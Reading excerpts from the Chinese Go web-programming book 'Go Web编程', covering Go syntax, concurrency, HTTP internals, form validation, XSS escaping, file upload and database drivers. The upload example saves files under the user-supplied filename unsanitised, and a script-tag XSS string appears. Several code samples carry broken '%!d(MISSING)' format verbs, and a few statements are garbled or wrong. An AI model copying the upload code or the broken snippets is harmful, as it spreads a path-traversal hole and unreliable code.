## Go Web编程
> 谢孟军

### 自序

Go语言的学习之路，用三天时间学习了Go语言的所有语法和基础知识。恰逢当时手上有一些小项目练手，在项目开发中进一步发现 Go语言具有三大优点：第一，性能好，我的Mac能够跑2万左右的并发；第二，语法简单，对于以前有C语言基础的人来说非常容易上手，我仅用一天时间就熟悉了基本语法，Go语言是一个上手即用的语言；第三，开发效率高，目前有很多编辑器支持Go语言，对于开发效率有很大的提升，一般的小项目半天就能解决。

越来越觉得Go是一门工程语言，而不是其他学院派。无论是开发、测试、部署、项目规模的扩展，或者是团队协作，Go语言考虑都非常周到；而且其语法恰当好处，不多不少，够用就是它的设计原则，所以Go语言非常适合项目的开发。

第二部分是Web开发，主要介绍了Go Web的基本原理、表单处理、数据库操作、Session和Cookie处理、文本处理、Socket编程、安全加密、国际化和本地化、错误处理和调试、如何部署和维护等知识点，并且针对整个Web 开发中需要用到的知识点，结合 Go 语言代码的原理进行了详细的介

### 推荐序一

我们说Go语言适合服务端开发，仅仅是因为它的标准库支持方面，目前是向服务端开发倾斜：
● 网络库（包括socket、http、rpc等）
● 编码库（包括json、xml、gob等）
● 加密库（各种加密算法、摘要算法，极其全面）
● Web（包括template、html支持）
而作为桌面开发的常规组件：GDI和UI系统与事件处理，基本没有涉及。

### 第1章 Go语言环境配置

Go 语言是一种云计算时代的语言，它能够充分利用计算机的多核，通过轻量级别的goroutine就可以实现多并发。

### 1.3 Go语言命令

go test
执行这个命令，会自动读取源码目录下名为*_test.go的文件，生成并运行测试用的可执行文件。

如何查看相应的package文档呢？如果是builtin包，那么执行go doc builtin；如果是http包，那么执行go doc net/http；查看某一个包里面的函数，则执行godoc fmt Printf；也可以查看相应的代码，执行godoc -src fmt Printf。

如果是builtin包，那么执行go doc builtin；如果是http包，那么执行go docnet/http；查看某一个包里面的函数，则执行godoc fmt Printf；也可以查看相应的代码，执行godoc -src fmtPrintf。

### 2.1 你好，Go

包的概念和Python中的module相同，它们都有一些特别的好处：模块化（能够把程序分成多个模块）和可重用性（每个模块都能被其他应用程序反复使用）。

### 2.2 Go语言基础

“？:=”这个符号直接取代了var和type，这种形式叫做简短声明。不过它有一个限制，那就是它只能用在函数内部；在函数外部使用则会无法编译通过，所以一般用var方式来定义全局变量。

Go 语言对于已声明但未使用的变量会在编译阶段报错

其中rune是int32的别称，byte是uint8的别称。
需要注意的一点是，这些类型的变量之间不允许互相赋值或操作，不然会在编译时引起编译器报错。

另外，尽管int的长度是32 bit，但int与int32并不可以互用。

浮点数的类型有float32和float64两种（没有float类型），默认是float64。

字符串
我们在上一节中讲过，Go语言中的字符串都是采用UTF-8字符集编码。字符串是用一对双引号（""）或反引号（` `）括起来定义，它的类型是string。

但如果真的想要修改怎么办？下面的代码可以实现。
￼
        s := "hello"￼
        c := []byte(s)  // 将字符串 s 转换为 []byte 类型￼
        c[0] = 'c'￼
        s2 := string(c)  // 再转换回 string 类型￼
        fmt.Printf("%!s(MISSING)\n", s2)

如果要声明一个多行的字符串怎么办？可以通过“`”来声明。
￼
        m := `hello￼
            world`
“`”括起的字符串为Raw字符串，即字符串在代码中的形式就是打印时的形式，它没有字符转义，换行也将原样输出。

Go语言内置有一个error类型，专门用来处理错误信息，Go语言的package里面还专门有一个包errors来处理错误。

同时声明多个常量、变量，或者导入多个包时，可采用分组的方式进行声明

        const(￼
            i = 100￼
            pi = 3.1415￼
            prefix = "Go_"￼
        )￼
        var(￼
            i int￼
            pi float32￼
            prefix string￼
        )

每个const分组的第一个常量被默认设置为它的0值，第二及后续的常量被默认设置为它前面那个常量的值，如果前面那个常量的值是iota，则它也被设置为iota。

iota枚举
Go语言里面有一个关键字iota，这个关键字用来声明enum的时候采用，它默认开始值是0，每调用一次加1。
￼
        const(￼
            x = iota  // x == 0￼
            y = iota  // y == 1￼
            z = iota  // z == 2￼
            w  // 常量声明省略值时，默认和之前一个值的字面相同。这里隐式地说 w = iota，因￼
    此w == 3。其实上面y和z可同样不用"= iota"￼
        )￼
        const v = iota // 每遇到一个const关键字，iota就会重置，此时v == 0
Go语言程序设计的一些规则

Go语言之所以简洁，是因为它有一些默认的行为。● 大写字母开头的变量是可导出的，即其他包可以读取，是公用变量；小写字母开头的不可导出，是私有变量。● 大写字母开头的函数也是一样，相当于class中带public关键词的公有函数；小写字母开头就是有private关键词的私有函数。

数组之间的赋值是值的赋值，即当把一个数组作为参数传入函数的时候，传入的其实是该数组的副本，而不是它的指针。如果要使用指针，那么就需要用到后面介绍的slice类型了。

Go 语言支持嵌套数组，即多维数组。比如下面的代码就声明了一个二维数组。

初始定义数组时，我们并不知道需要多大的数组，因此我们就需要“动态数组”。在Go语言里面这种数据结构叫slice。slice并不是真正意义上的动态数组，而是一个引用类型。slice总是指向一个底层array， slice的声明也可以像array一样，只是不需要长度。

slice 可以从一个数组或一个已经存在的slice 中再次声明。slice 通过array[i:j]来获取，其中i是数组的开始位置，j是结束位置，但不包含array[j]，它的长度是j-i。

注：slice和数组在声明数组时，方括号内写明了数组的长度或使用...自动计算长度，而声明slice时，方括号内没有任何字符。

● 如果从一个数组里面直接获取slice，可以这样ar[:]，因为默认第一个序列是0，第二个是数组的长度，即等价于ar[0:len(ar)]。


slice是引用类型，所以当引用改变其中元素的值时，其他的所有引用都会改变该值，例如上面的aSlice和bSlice，如果修改了aSlice中元素的值，那么bSlice相对应的值也会改变。
从概念上面来说slice像一个结构体，这个结构体包含了三个元素。
● 一个指针，指向数组中slice指定的开始位置。
● 长度，即slice的长度。
● 最大长度，也就是slice开始位置到数组的最后位置的长度。

使用map过程中需要注意以下几点。
● map是无序的，每次打印出来的map都会不一样，它不能通过index获取，而必须通过key获取。
● map的长度是不固定的，也就是和slice一样，也是一种引用类型。
● 内置的len函数同样适用于map，返回map拥有的key的数量。

// map有两个返回值，第二个返回值，如果不存在key，那么ok为false，如果存在ok为true￼
        csharpRating, ok := rating["C#"]￼

上文说过，map也是一种引用类型，如果两个map同时指向一个底层，那么一个改变，另一个也相应改变。

make 用于内建类型（map、slice 和 channel）的内存分配。new用于各种类型的内存分配。

内建函数 new 本质上说跟其他语言中的同名函数功能一样：new（T）分配了零值填充的T类型的内存空间，并且返回其地址，即一个*T类型的值。用Go语言的术语说，它返回了一个指针，指向新分配的类型T的零值。所以我们需要记住这一点：new返回指针。

make只能创建slice、map和channel，并且返回一个有初始值（非零）的T类型，而不是*T。本质来讲，导致这三个类型有所不同的原因是，指向数据结构的引用在使用前必须被初始化。例如，一个slice，是一个包含指向数据（内部array）的指针、长度和容量的三项描述符，在这些项目被初始化之前，slice为nil。对于slice、map和channel来说，make初始化了内部的数据结构，填充适当的值。make返回初始化后的（非零）值。

### 2.3 流程和函数

Go语言的if还有一个强大的地方就是条件判断语句里面允许声明一个变量，这个变量的作用域只能在该条件逻辑块内，其他地方就不起作用了，如下所示。

在循环里面有两个关键操作break和continue ,break操作是跳出当前循环，continue是跳过本次循环。当嵌套过深的时候，break 可以配合标签使用，即跳转至标签所指定的位置，详细参考如下例子。

arg ...int告诉我们Go语言这个函数接受不定数量的参数。注意，这些参数的类型全部是int。在函数体中，变量arg是一个int的slice。


那么传指针到底有什么好处呢？
● 传指针使得多个函数能操作同一个对象。
● 传指针比较轻量级（8bytes），只是传内存地址，我们可以用指针传递体积大的结构体。如果用参数值传递的话，在每次copy上面就会花费相对较多的系统开销（内存和时间）。所以当你要传递大的结构体的时候，用指针是一个明智的选择。
● Go语言中string，slice，map这三种类型的实现机制类似指针，所以可以直接传递，而不用取地址后传递指针。注意，若函数需改变 slice 的长度，则仍需要取地址传递指针

recover仅在延迟函数中有效

2.别名操作
别名操作顾名思义，我们可以把包命名成另一个我们用起来容易记忆的名字。
￼
        import(￼
            f "fmt"￼
        )

_操作其实是引入该包，不直接使用包里面的函数，而是调用了该包里面的init函数。

### 2.4 struct类型

Go语言支持只提供类型，而不写字段名的方式，也就是匿名字段，或称为嵌入字段。
当匿名字段是一个struct的时候，那么这个struct所拥有的全部字段都被隐式地引入了当前定义的这个struct。


Human  // 匿名字段，那么默认Student就包含了Human的所有字段￼

匿名字段就是这样，能够实现字段的继承。

不仅仅是struct字段，所有的内置类型和自定义类型都可以作为匿名字段。

int   // 内置类型作为匿名字段￼

// 修改匿名内置类型字段￼
            jane.int = 3￼

有个问题：如果human 里面有一个字段叫做phone，而student 也有一个字段叫做phone，那么该怎么办呢？
Go 语言很简单地解决了这个问题，最外层的优先访问，也就是当你通过student.phone访问的时候，是访问student里面的字段，而不是human里面的字段。
这样就允许我们去重载通过匿名字段继承的一些字段，当然如果我们想访问重载后对应匿名类型里面的字段，可以通过匿名字段名来访问。

### 2.5 面向对象

但是area()不是作为Rectangle的方法实现的（类似面向对象里面的方法），而是将Rectangle的对象（如r1,r2）作为参数传入函数计算面积。

基于上述原因，就有了method的概念，method附属在一个给定的类型上，它的语法和函数的声明语法几乎一样，只是在 func 后面增加了一个 receiver（也就是 method所依从的主体）。

“A method is a function with an implicit first argument, called a receiver。”

使用method的时候重要注意以下几点。
● 虽然method的名字一模一样，但是如果接收者不一样，那么method就不一样。
● method里面可以访问接收者的字段。
● 调用method通过访问，就像struct里面访问字段一样。


指针作为receiver
现在让我们回过头来看看SetColor这个method，它的receiver是一个指向Box的指针，是的，你可以使用*Box。想想为啥要使用指针而不是Box本身呢？
我们定义SetColor的真正目的是想改变这个Box的颜色，如果不传Box的指针，那么SetColor接受的其实是Box的一个copy，也就是说，method中对于颜色值的修改，其实只作用于Box的copy，而不是真正的Box。所以我们需要传入指针。


method继承
我们学习了字段的继承之后，还会发现Go语言的一个神奇之处，即method也是可以继承的。

### 2.6 interface

简单地说，interface是一组method的组合，我们通过interface来定义对象的一组行为。

任意的类型都实现了空interface（我们这样定义：interface{}），也就是包含0个method的interface。

interface里面到底能存什么值呢？如果我们定义了一个interface的变量，那么这个变量里面可以存储实现这个interface的任意类型的对象。例如上面例子中，我们定义了一个 Men interface 类型的变量 m，那么 m 里面可以存储 Human、Student 或者Employee值。


// Interface Men被Human,Student和Employee实现￼
        // 因为这三个类型都实现了这两个方法￼
        type Men interface {￼
            SayHi()￼
            Sing(lyrics string)￼
        }￼

//定义了slice Men￼
            fmt.Println("Let's use a slice of Men and see what happens")￼
            x := make([]Men, 3)￼
            //T这三个都是不同类型的元素，但是他们实现了interface同一个接口￼
            x[0], x[1], x[2] = paul, sam, mike￼
            for _, value := range x{￼
                value.SayHi()￼
            }￼

空interface(interface{})不包含任何的method，正因为如此，所有的类型都实现了空interface。空interface对于描述起不到任何的作用（因为它不包含任何的method），但是空interface在我们需要存储任意类型的数值时相当有用，因为它可以存储任意类型的数值，有点类似于C语言的void*类型。

一个函数把interface{}作为参数，那么它可以接受任意类型的值作为参数，如果一个函数返回interface{}，就可以返回任意类型的值。非常有用！

interface的变量可以持有任意实现该interface类型的对象，这给我们编写函数（包括method）提供了一些额外的思考，我们是否可以通过定义interface参数，让函数接受各种类型的参数。

打开fmt的源码文件，你会看到这样一个定义。
￼
        type Stringer interface {￼
            String() string￼
        }
也就是说，任何实现了String方法的类型都能作为参数被fmt.Println调用

注：实现了error接口的对象（即实现了Error() string的对象），使用fmt输出时，会调用Error()方法，因此不必再定义String()方法了。

Go 语言里面有一个语法，可以直接判断是否是该类型的变量： value, ok =element.(T)，这里value就是变量的值，ok是一个bool类型，element是interface变量， T是断言的类型。

if value, ok := element.(int); ok {￼
                    fmt.Printf("list[%!d(MISSING)] is an int and its value is %!d(MISSING)\n", index,￼
    value)￼
                } else if value, ok := element.(string); ok {￼
                    fmt.Printf("list[%!d(MISSING)] is a string and its value is %!s(MISSING)\n", index,￼
    value)￼
                } else if value, ok := element.(Person); ok {￼
                    fmt.Printf("list[%!d(MISSING)] is a Person and its value is %!s(MISSING)\n", index,￼
    value)￼

我们断言的类型越多，那么ifelse也就越多，所以才引出了下面要介绍的switch。
● switch测试


switch value := element.(type) {￼
                    case int:￼
                    fmt.Printf("list[%!d(MISSING)] is an int and its value is %!d(MISSING)\n", index,￼
    value)￼
                    case string:￼
                    fmt.Printf("list[%!d(MISSING)] is a string and its value is %!s(MISSING)\n",￼
    index, value)￼
                    case Person:￼
                    fmt.Printf("list[%!d(MISSING)] is a Person and its value is %!s(MISSING)\n",￼
    index, value)￼
                    default:￼
                    fmt.Println("list[%!d(MISSING)] is of a different type", index)￼
                }￼

：element.(type)语法不能在switch外的任何逻辑里面使用，如果你要在switch外面判断一个类型就使用comma-ok。

如果一个interface1作为interface2的一个嵌入字段，那么interface2隐式的包含了interface1里面的method。

sort.Interface其实就是嵌入字段，把sort.Interface的所有method隐式包含进来了，也就是下面三个方法。

io包下面的 io.ReadWriter ，它包含了io包下面的Reader和Writer两个interface。
￼
        // io.ReadWriter￼
        type ReadWriter interface {￼
            Reader￼
            Writer￼
        }

Go语言实现了反射，所谓反射就是动态运行时的状态。

使用reflect一般分成三步：要去反射是一个类型的值（这些值都实现了空interface），首先需要把它转化成reflect对象（reflect.Type或者reflect.Value，根据不同的情况调用不同的函数）。


        t := reflect.TypeOf(i)   //得到类型的元数据,通过t我们能获取类型定义里面的所有￼
    元素￼
        v := reflect.ValueOf(i)   //得到实际的值，通过v我们获取存储在里面的值，还可以￼
    去改变值
转化为reflect对象之后我们就可以进行一些操作了，也就是将reflect对象转化成相应的值，如下所示。
￼
        tag := t.Elem().Field(0).Tag  //获取定义在struct里面的标签￼
        name := v.Elem().Field(0).String()  //获取存储在第一个字段里面的值

### 2.7 并发

goroutine是Go语言并行设计的核心。goroutine说到底就是线程，但是它比线程更小，十几个 goroutine 可能体现在底层就是五六个线程，Go 语言内部帮你实现了这些goroutine之间的内存共享。执行goroutine只需极少的栈内存（大概是4~5KB），当然会根据相应的数据伸缩。也正因为如此，可同时运行成千上万个并发任务。goroutine比thread更易用、更高效、更轻便。

goroutine是通过Go语言runtime管理的一个线程管理器。goroutine通过go关键字实现了，其实就是一个普通的函数。

runtime.Gosched()表示让 CPU 把时间片让给别人，下次某个时候继续恢复执行该goroutine。

Go语言提供了一个很好的通信机制channel。channel可以与Unix shell 中的双向管道做类比，通过它发送或者接收值。这些值只能是特定的类型：channel类型。定义一个 channel 时，也需要定义发送到 channel 的值的类型。注意，必须使用make 创建channel。

默认情况下，channel 接收和发送数据都是阻塞的，除非另一端已经准备好，这样就使得Goroutines同步变得更加简单，而不需要显式的lock。所谓阻塞，也就是如果读取（value := <-ch），它将会被阻塞，直到有数据接收。另外，任何发送（ch<-5）将会被阻塞，直到数据被读出。无缓冲channel是在多个goroutine之间同步很棒的工具。

for i := range c能够不断读取channel里面的数据，直到该channel被显式的关闭。上面代码中，我们看到可以显式的关闭channel，生产者通过关键字close函数关闭channel。关闭channel之后就无法再发送任何数据了，在消费方可以通过语法v, ok := <-ch测试channel是否被关闭。如果ok返回false，那么说明channel已经没有任何数据并且已经被关闭。

记住应该在生产者的地方关闭 channel，而不是消费的地方去关闭它，这样容易引起panic。另外，channel 不像文件之类需要经常去关闭，只有当你确实没有任何数据发送了，或者你想显式的结束range循环之类的操作。

如果存在多个channel，我们该如何操作？Go语言里面提供了一个关键字select，通过select可以监听channel上的数据流动。

select默认是阻塞的，只有当监听的channel中发送或接收可以进行时才会运行，当多个channel都准备好的时候，select是随机选择一个执行的。

有时候会出现 goroutine 阻塞的情况，我们如何避免整个的程序进入阻塞的情况？可以利用select来设置超时，通过如下的方式实现。

case <- time.After(5 * time.Second):￼
                        println("timeout")￼
                        o <- true￼
                        break￼

### 2.8 总结

● go 用于并行

 struct 用于定义抽象数据类型

● type用于声明自定义类型

● range用于读取slice、map、channel数据记住这25个关键字，你就差不多学会Go语言了。

### 3.1 Web工作方式

普通的上网过程，系统其实是这样做的：浏览器本身是一个客户端，当你输入URL的时候，浏览器首先会去请求DNS服务器，通过DNS获取相应域名对应的IP，然后通过IP地址找到IP对应的服务器后，要求建立TCP连接，等浏览器发送完HTTP Request （请求）包后，服务器接收到请求包之后才开始处理请求包，服务器调用自身服务，返回HTTP Response（响应）包；客户端收到来自服务器的响应后开始渲染这个Response包里的主体（body），等收到全部的内容，随后断开与该服务器之间的TCP连接

Web服务器的工作原理可以简单地归纳如下。
● 客户端通过TCP/IP协议建立到服务器的TCP连接。
● 客户端向服务器发送HTTP协议请求包，请求服务器里的资源文档。
● 服务器向客户机发送 HTTP 协议应答包，如果请求的资源包含有动态语言的内容，那么服务器会调用动态语言的解释引擎负责处理“动态内容”，并将处理得到的数据返回给客户端。
● 客户端与服务器断开。由客户端解释HTML文档，在客户端屏幕上渲染图形结果。

我们浏览网页都是通过URL访问的，那么URL到底是怎么样的？
URL（Uniform Resource Locator）是“统一资源定位符”的英文缩写，用于描述一个网络上的资源，基本格式如下。
￼
        scheme://host[:port#]/path/.../[?query-string][#anchor]￼
        scheme        指定低层使用的协议(例如：http, https, ftp)￼
        host          HTTP服务器的IP地址或者域名￼
        port#         HTTP服务器的默认端口是80，这种情况下端口号可以省略。如果使用了别的￼
    端口，必须指明，例如 http://www.cnblogs.com:8080/￼
        path          访问资源的路径￼
        query-string   发送给http服务器的数据￼
        anchor        锚

HTTP协议是无状态的，同一个客户端的这次请求和上次请求是没有对应关系，对HTTP服务器来说，它并不知道这两个请求是否来自同一个客户端。为了解决这个问题， Web程序引入了Cookie机制来维护连接的可持续状态。

HTTP请求包（浏览器信息）
我们先来看看Request包的结构，Request包分为3部分，第一部分叫Request line （请求行），第二部分叫Request header（请求头），第三部分是body（主体）。header和body之间有个空行

1.GET提交的数据会放在URL之后，以?分割URL和传输数据，参数之间以&相连，如EditPosts.aspx?name=test1&id=123456。POST方法是把提交的数据放在HTTP包的Body中。
2.GET提交的数据大小有限制（因为浏览器对URL的长度有限制），而POST方法提交的数据没有限制。
3.GET方式提交数据，会带来安全问题，比如一个登录页面，通过GET方式提交数据时，用户名和密码将出现在 URL 上，如果页面可以被缓存或者其他人可以访问这台机器，就可以从历史记录获得该用户的账号和密码。

Date:Date: Tue, 30 Oct 2012 04:14:25 GMT       //发送时间￼
        Content-Type: text/html           //服务器发送信息的类型￼
        Transfer-Encoding: chunked         //表示发送HTTP包是分段发的￼
        Connection: keep-alive            //保持连接状态￼
        Content-Length: 90                //主体内容长度￼
        //空行 用来分割消息头和主体￼

无状态是指协议对于事务处理没有记忆能力，服务器不知道客户端是什么状态。从另一方面讲，打开一个服务器上的网页和你之前打开这个服务器上的网页之间没有任何联系

从HTTP/1.1起，默认都开启了Keep-Alive保持连接特性，简单地说，当一个网页打开完成后，客户端和服务器之间用于传输 HTTP 数据的 TCP 连接不会关闭，如果客户端再次访问这个服务器上的网页，会继续使用这一条已经建立的TCP连接。
Keep-Alive 不会永久保持连接，它有一个保持时间，可以在不同服务器软件（如Apache）中设置这个时间。

这就是浏览器的一个功能，第一次请求url，服务器端返回的是html页面，然后浏览器开始渲染HTML：当解析到HTML DOM里面的图片链接，css脚本和js脚本的链接，浏览器就会自动发起一个请求静态资源的HTTP请求，获取相对应的静态资源，然后浏览器就会渲染出来，最终将所有资源整合、渲染，完整展现在屏幕上。

注：网页优化方面有一项措施是减少HTTP请求次数，把尽量多的css和js资源合并在一起，目的是尽量减少网页请求静态资源的次数，提高网页加载速度，同时减缓服务器的压力。

### 3.2 Go语言搭建一个Web服务器

r.ParseForm()  //解析参数，默认是不会解析的￼
            fmt.Println(r.Form)  //这些信息是输出到服务器端的打印信息￼

我们看到 Go 语言通过简单的几行代码就已经能运行一个 Web 服务，而且这个Web服务内部有支持高并发的特性，接下来两小节将详细讲解Go语言如何实现Web高并发。

### 3.3 Go语言如何使Web工作

以下均是服务器端的几个概念。
Request：用户请求的信息，用来解析用户的请求信息，包括post、get、Cookie、url等信息。
Response：服务器需要反馈给客户端的信息。
Conn：用户的每次请求链接。
Handler：处理请求和生成返回信息的处理逻辑。

1.创建Listen Socket，监听指定的端口，等待客户端请求到来。
2.Listen Socket接受客户端的请求, 得到Client Socket，接下来通过Client Socket与客户端通信。
3.处理客户端的请求，首先从Client Socket读取HTTP请求的协议头，如果是POST方法，还可能要读取客户端提交的数据，然后交给相应的handler处理请求，handler处理完毕准备好客户端需要的数据，通过Client Socket写给客户端。

ListenAndServe来监听的，这个底层其实这样处理的：初始化一个server对象，调用net. Listen("tcp", addr)，也就是底层用TCP协议搭建了一个服务，然后监控我们设置的端口。

### 3.4 Go语言的http包详解

Go 语言为了实现高并发和高性能, 使用goroutines处理Conn的读写事件，这样每个请求都能保持独立，相互不会阻塞，以高效响应网络事件。这是Go语言高效的保证。

客户端的每次请求都会创建一个Conn，这个Conn里面保存了该次请求的信息，然后再传递到对应的handler，该handler中便可以读取到相应的header信息，以保证了每个请求的独立性。

上文讲述conn.server时，内部调用了http包默认的路由器，通过路由器把本次请求的信息传递到了后端的处理函数。那么这个路由器是怎么实现的呢？

mu sync.RWMutex   //锁，由于请求涉及到并发处理，因此这里需要一个锁机制￼
            m  map[string]muxEntry  // 路由规则，一个 string 对应一个 mux 实体，这里的￼

type muxEntry struct {￼
            explicit bool   // 是否精确匹配￼
            h       Handler // 这个路由表达式对应哪个handler￼
        }

接着看一下handler的定义。
￼
        type Handler interface {￼
            ServeHTTP(ResponseWriter, *Request)  // 路由实现器￼
        }

原来在http包里面还定义了一个类型HandlerFunc，我们定义的函数sayhelloName就是这个HandlerFunc调用之后的结果，这个类型默认就实现了 ServeHTTP 这个接口，即我们调用了 HandlerFunc(f)，类似强制类型转换 f 成为HandlerFunc类型，这样f就拥有了ServHTTP方法。

路由器里面存储好了相应的路由规则之后，具体的请求又是怎么分发的呢？路由器接收到请求之后调用mux.handler(r).ServeHTTP(w, r)，也就是调用对应路由的handler的ServerHTTP接口，那么mux.handler(r)怎么处理的呢？

  // Host-specific pattern takes precedence over generic ones￼
            h := mux.match(r.Host + r.URL.Path)￼
            if h == nil {￼
                h = mux.match(r.URL.Path)￼
            }￼
            if h == nil {￼
                h = NotFoundHandler()￼
            }￼
            return h￼

Go 语言其实支持外部实现的路由器 ListenAndServe的第二个参数就是用以配置外部路由器的，它是一个Handler接口，即外部路由器只要实现了 Handler 接口就可以，我们可以在自己实现的路由器的ServHTTP里面实现自定义路由功能。

● 选择handler：
a.判断是否有路由能满足这个request（循环遍历ServerMux的muxEntry）。
b.如果有路由满足，调用这个路由handler的ServeHttp。
c.如果没有路由满足，调用NotFoundHandler的ServeHttp。


### 4.1 处理表单的输入

r.ParseForm()       //解析 url 传递的参数，对于 POST 则解析响应包的主体￼
    （request body）￼
            //注意:如果没有调用ParseForm方法，下面无法获取表单的数据￼
            fmt.Println(r.Form) //这些信息是输出到服务器端的打印信息￼

fmt.Println("method:", r.Method) //获取请求的方法￼
            if r.Method == "GET" {￼
                t, _ := template.ParseFiles("login.gtpl")￼
                t.Execute(w, nil)￼
            } else {￼
                //请求的是登陆数据，那么执行登陆的逻辑判断￼
                fmt.Println("username:", r.Form["username"])￼
                fmt.Println("password:", r.Form["password"])￼
            }￼

request.Form是一个url.Values类型，里面存储着对应的类似key=value的信息，下面展示了可以对form数据进行的一些操作。
￼
        v := url.Values{}￼
        v.Set("name", "Ava")￼
        v.Add("friend", "Jess")￼

// v.Encode() == "name=Ava&friend=Jess&friend=Sarah&friend=Zoe"￼

### 4.2 验证表单的输入

开发 Web 的一个原则就是，不能信任用户输入的任何信息，所以验证和过滤用户的输入信息就变得非常重要，我们经常在微博、新闻中听到某某网站被入侵了，存在什么漏洞，这些大多是因为网站对于用户输入的信息没有做严格的验证引起的，所以为了编写出安全可靠的Web程序，验证表单输入的意义重大。

getint,err:=strconv.Atoi(r.Form.Get("age"))￼
        if err!=nil{￼
            //数字转化出错了，那么可能就不是数字￼
        }￼

如果我们想验证表单输入的是否是身份证，通过正则也可以方便地验证，但是身份证有15位和18位，我们需要两个都验证。

### 4.3 预防跨站脚本

所谓动态内容，就是根据用户环境和需要，Web应用程序能够输出相应的内容。动态站点会受到一种名为“跨站脚本攻击”（Cross Site Scripting，安全专家们通常将其缩写成 XSS）的威胁，而静态站点则完全不受其影响。

对 XSS 最佳的防护应该结合以下两种方法：一是验证所有输入数据，有效检测攻击（这个我们前面小节已经有过介绍）；另一个是对所有输出数据进行适当的处理，以防止任何已成功注入的脚本在浏览器端运行。

Go语言的html/template有以下几个函数可以帮你转义。
● func HTMLEscape(w io.Writer, b []byte) //把b进行转义之后写到w
● func HTMLEscapeString(s string) string //转义s之后返回结果字符串
● func HTMLEscaper(args ...interface{}) string //支持多个参数一起转义，返回结果字符串

fmt.Println("password:",￼
    template.HTMLEscapeString(r.Form.Get("password")))￼
        template.HTMLEscape(w, []byte(r.Form.Get("username"))) //输出到客户端

Go语言的html/template包默认帮你过滤了html标签，但是有时候你只想要输出这个<script>alert()</script>看起来正常的信息，该怎么处理？请使用text/template。

### 4.4 防止多次递交表单

4.4 防止多次递交表单
不知道你是否曾经看到过论坛或者博客，某个帖子或者文章后面出现多条重复的记录，多是因为用户重复递交了留言的表单所引起。

解决方案是在表单中添加一个带有唯一值的隐藏字段。在验证表单时，先检查带有该唯一值的表单是否已经递交过了。如果是，拒绝再次递交；如果不是，则处理表单进行逻辑处理。

隐藏字段token，这个值是通过MD5（时间戳）来获取的唯一值，然后我们把这个值存储到服务器端（Session 来控制，

### 4.5 处理文件上传

使表单能够上传文件，首先就是要添加form的enctype属性，enctype属性有如下三种情况。
￼
        application/x-www-form-urlencoded   表示在发送前编码所有字符（默认）￼
        multipart/form-data   不对字符编码。在使用包含文件上传控件的表单时，必须使用该值。￼
        text/plain   空格转换为 "+" 加号，但不对特殊字符编码。

<form   enctype="multipart/form-data"   action="http://127.0.0.1:9090/￼
    upload" method="post">￼

file, handler, err := r.FormFile("uploadfile")￼
                if err != nil {￼
                    fmt.Println(err)￼
                    return￼
                }￼
                defer file.Close()￼
                fmt.Fprintf(w, "%!v(MISSING)", handler.Header)￼
                f, err := os.OpenFile("./test/"+handler.Filename, os.O_WRONLY|￼
    os.O_CREATE, 0666)￼
                if err != nil {￼
                    fmt.Println(err)￼
                    return￼
                }￼
                defer f.Close()￼
                io.Copy(f, file)￼

我们需要调用r.ParseMultipartForm处理文件上传，里面的参数表示maxMemory，调用ParseMultipartForm之后，上传的文件存储在maxMemory大小的内存里面，如果文件大小超过了 maxMemory，那么剩下的部分将存储在系统的临时文件中。我们可以通过r.FormFile获取上面的文件句柄，然后实例中使用了io.Copy来存储文件。

1.表单中增加enctype="multipart/form-data"。
2.服务端调用r.ParseMultipartForm，把上传的文件存储在内存和临时文件中。
3.使用r.FormFile获取文件句柄，然后对文件进行存储等处理。

type FileHeader struct {￼
            Filename string￼
            Header   textproto.MIMEHeader￼
            // contains filtered or unexported fields￼
        }

其实Go语言支持模拟客户端表单功能支持文件上传，详细用法请看如下示例。

            bodyBuf := &bytes.Buffer{}￼
            bodyWriter := multipart.NewWriter(bodyBuf)￼
            //关键的一步操作￼
            fileWriter, err := bodyWriter.CreateFormFile("uploadfile", filename)￼

            //打开文件句柄操作￼
            fh, err := os.Open(filename)￼
            if err != nil {￼
                fmt.Println("error opening file")￼
                return err￼
            }￼
            //iocopy￼
            _, err = io.Copy(fileWriter, fh)￼
            if err != nil {￼
                return err￼
            }￼
            contentType := bodyWriter.FormDataContentType()￼
            bodyWriter.Close()￼

            resp, err := http.Post(targetUrl, contentType, bodyBuf)￼
            if err != nil {￼
                return err￼
            }￼
            defer resp.Body.Close()￼
            resp_body, err := ioutil.ReadAll(resp.Body)￼
            if err != nil {￼
                return err￼
            }￼
            fmt.Println(resp.Status)￼
            fmt.Println(string(resp_body))￼
            return nil￼

### 5.1 database/sql接口

Go语言与PHP语言不同的地方是Go语言没有官方提供数据库驱动，而是为开发者开发数据库驱动定义了一些标准接口，开发者可以根据定义的接口来开发相应的数据库驱动，这样做有一个好处，只要按照标准接口开发的代码，以后需要迁移数据库时，不需要任何修改。

//https://github.com/mattn/go-sqlite3驱动￼
        func init() {￼
            sql.Register("sqlite3", &SQLiteDriver{})￼
        }￼

driver.Driver
Driver是一个数据库驱动的接口，他定义了一个method： Open(name string)，这个方法返回一个数据库的Conn接口。
￼
        type Driver interface {￼
            Open(name string) (Conn, error)￼
        }

返回的Conn只能用来进行一次goroutine的操作，也就是说不能把这个Conn应用于Go语言的多个goroutine里面。

Conn是一个数据库连接的接口定义，它定义了一系列方法，这个Conn只能应用在一个goroutine里面，不能用在多个goroutine里面

Prepare函数返回与当前连接相关的执行Sql语句的准备状态，可以进行查询、删除等操作。
Close 函数关闭当前的连接，执行释放连接拥有的资源等清理工作。因为驱动实现了database/sql里面建议的conn pool，所以读者不用再去实现缓存conn之类的，这样会容易引起问题。

driver.Tx
事务处理一般就两个过程，递交或者回滚。数据库驱动里面也只需要实现这两个函数即可。
￼
        type Tx interface {￼
            Commit() error￼
            Rollback() error￼
        }
这两个函数一个用来递交一个事务，另一个用来回滚事务。

driver.Result
这是执行Update/Insert等操作返回的结果接口定义。
￼
        type Result interface {￼
            LastInsertId() (int64, error)￼
            RowsAffected() (int64, error)￼
        }
LastInsertId函数返回由数据库执行插入操作得到的自增ID号。
RowsAffected函数返回query操作影响的数据条目数。

RowsAffested其实就是一个int64的别名，但是它实现了Result接口，以底层实现Result的表示方式。
￼
        type RowsAffected int64￼
        func (RowsAffected) LastInsertId() (int64, error)￼
        func (v RowsAffected) RowsAffected() (int64, error)

Value其实就是一个空接口，它可以容纳任何数据。
￼
        type Value interface{}
drive的Value是驱动必须能够操作的Value，Value要么是nil，要么是下面的任意一种。

